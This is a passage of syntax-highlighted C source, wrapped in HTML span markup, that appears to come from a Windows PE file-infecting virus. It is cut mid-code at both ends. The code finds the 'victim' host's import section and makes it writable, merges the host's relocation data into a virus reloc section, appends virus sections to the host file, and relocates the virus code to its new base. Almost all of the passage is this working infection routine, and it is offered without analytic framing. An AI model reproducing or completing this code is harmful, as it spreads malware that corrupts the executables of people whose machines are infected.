    </span><span class="sc11">HostRVAImports</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// Search for victim import section
</span><span class="sc0">    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">HostNSections</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">HostRVAImports</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">// Do it writable
</span><span class="sc0">        </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">Characteristics</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc11">IMAGE_SCN_MEM_WRITE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc2">// Check if last section is .reloc
</span><span class="sc0">    </span><span class="sc11">HostRelocsSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc2">// Then we'll join it to virus reloc section
</span><span class="sc0">      </span><span class="sc11">VirusBaseRVA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SectionRVA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HostRelocs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">MEMALLOC</span><span class="sc10">((</span><span class="sc11">HostRelocsSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="sc10">].</span><span class="sc11">Size</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">L_Exit_Infect</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc5">else</span><span class="sc0">  </span><span class="sc2">// Read the .reloc section
</span><span class="sc0">      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">HostNSections</span><span class="sc10">--;</span><span class="sc0">
        </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc10">].</span><span class="sc11">PointerToRawData</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_BEGIN</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0">  </span><span class="sc11">HostRelocs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HostRelocsSize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">BytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc10">].</span><span class="sc11">PointerToRawData</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_BEGIN</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">  </span><span class="sc2">// There is no .reloc or it is not the last section
</span><span class="sc0">    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">// There are relocs but we didn't find them, so exit
</span><span class="sc0">        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">L_Exit_Infect</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc11">VirusBaseRVA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SectionRVA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SizeOfImage</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_END</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">FirstVirusSection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HostNSections</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// Add virus section table
</span><span class="sc0">    </span><span class="sc11">CopyMemory</span><span class="sc10">(&amp;</span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">VirusSections</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">// Reloc virus code &amp; fix reloc sections
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">Relocations</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MEMALLOC</span><span class="sc10">((</span><span class="sc11">VirusRelocSize</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0x1000</span><span class="sc10">)?</span><span class="sc0"> </span><span class="sc11">VirusRelocSize</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc4">0x1000</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">// Minimun a page
</span><span class="sc0">    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">L_Exit_Infect</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">CopyMemory</span><span class="sc10">(</span><span class="sc11">Relocations</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">IDosHeader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">VirusRelocSection</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">VirusRelocSection</span><span class="sc10">].</span><span class="sc11">Misc</span><span class="sc10">.</span><span class="sc11">VirtualSize</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">VirusRelocSize</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">VirusRelocSize</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">RelocBlock</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_BASE_RELOCATION</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">Relocations</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PtrReloc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_RELOCATION_DATA</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">Relocations</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_BASE_RELOCATION</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc2">// Reloc all virus sections and write them to disk
</span><span class="sc0">    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">VirusSections</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">RelocsInBlock</span><span class="sc10">;</span><span class="sc0">

      </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">PointerToRawData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_CURRENT</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SectionRVA</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">FileAlignment</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">(-(</span><span class="sc16">long</span><span class="sc10">)</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">FileAlignment</span><span class="sc10">);</span><span class="sc0">
      
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">VirusRelocSection</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc2">// Virus reloc section?
</span><span class="sc0">      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SectionRVA</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="sc10">].</span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HostRelocsSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">VirusRelocSize</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">Misc</span><span class="sc10">.</span><span class="sc11">VirtualSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HostRelocsSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">VirusRelocSize</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HostRelocsSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">VirusRelocSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">FileAlignment</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">(-(</span><span class="sc16">long</span><span class="sc10">)</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">FileAlignment</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">// Write host relocations
</span><span class="sc0">        </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HostRelocs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HostRelocsSize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">BytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">// Add virus relocations
</span><span class="sc0">        </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Relocations</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">VirusRelocSize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">BytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">// Fill with zeros until file alignment
</span><span class="sc0">        </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">Relocations</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x1000</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Relocations</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HostRelocsSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">VirusRelocSize</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">BytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc5">else</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">Ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">MEMALLOC</span><span class="sc10">(</span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">L_Exit_Infect</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">CopyMemory</span><span class="sc10">(</span><span class="sc11">Ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">IDosHeader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc2">// Patch Visual C 5.0 heap in .data section
</span><span class="sc1">/*
        {
          DWORD * PtrHeap = &amp;__small_block_heap;

          if (((DWORD)IDosHeader + ISection[i].VirtualAddress &lt; (DWORD)PtrHeap)
               &amp;&amp;
              ((DWORD)IDosHeader + ISection[i].VirtualAddress + ISection[i].SizeOfRawData &gt; (DWORD)PtrHeap)
             )
          {
            PtrHeap = (DWORD *)(Ptr + (DWORD)PtrHeap - (DWORD)IDosHeader - ISection[i].VirtualAddress);
            PtrHeap[3] = PtrHeap[2];
            PtrHeap[4] = PtrHeap[5] = (DWORD)-1;
          }
        }
*/</span><span class="sc0">        
        </span><span class="sc2">// Do relocations in this section
</span><span class="sc0">        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">RelocBlock</span><span class="sc10">-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                </span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">PtrReloc</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">Relocations</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">VirusRelocSizeDir</span><span class="sc10">)</span><span class="sc0">
              </span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">Base</span><span class="sc10">;</span><span class="sc0">

          </span><span class="sc11">Base</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">RelocBlock</span><span class="sc10">-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">RelocsInBlock</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">RelocBlock</span><span class="sc10">-&gt;</span><span class="sc11">SizeOfBlock</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_BASE_RELOCATION</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_RELOCATION_DATA</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">RelocsInBlock</span><span class="sc10">--)</span><span class="sc0">
          </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PtrReloc</span><span class="sc10">-&gt;</span><span class="sc11">RelocType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">IMAGE_REL_BASED_HIGHLOW</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc10">*((</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">Ptr</span><span class="sc10">[</span><span class="sc11">Base</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">PtrReloc</span><span class="sc10">-&gt;</span><span class="sc11">RelocOfs</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">ImageBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">);</span><span class="sc2">//RelocBlock-&gt;VirtualAddress);
</span><span class="sc0">              </span><span class="sc10">*((</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">Ptr</span><span class="sc10">[</span><span class="sc11">Base</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">PtrReloc</span><span class="sc10">-&gt;</span><span class="sc11">RelocOfs</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">ImageBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">SectionRVA</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">PtrReloc</span><span class="sc10">++;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc11">RelocBlock</span><span class="sc10">-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">RelocBlock</span><span class="sc10">-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">SectionRVA</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">RelocBlock</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_BASE_RELOCATION</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">PtrReloc</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">PtrReloc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_RELOCATION_DATA</span><span class="sc0"> </span><span class="sc10">*)((</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">RelocBlock</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_BASE_RELOCATION</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc2">// Check if this is the Import section
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">VirusImportSection</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Imports</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">IMAGE_THUNK_DATA</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">DataImports</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">StartImports</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">DeltaRVAs</span><span class="sc10">;</span><span class="sc0">

          </span><span class="sc11">DeltaRVAs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SectionRVA</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">;</span><span class="sc0">
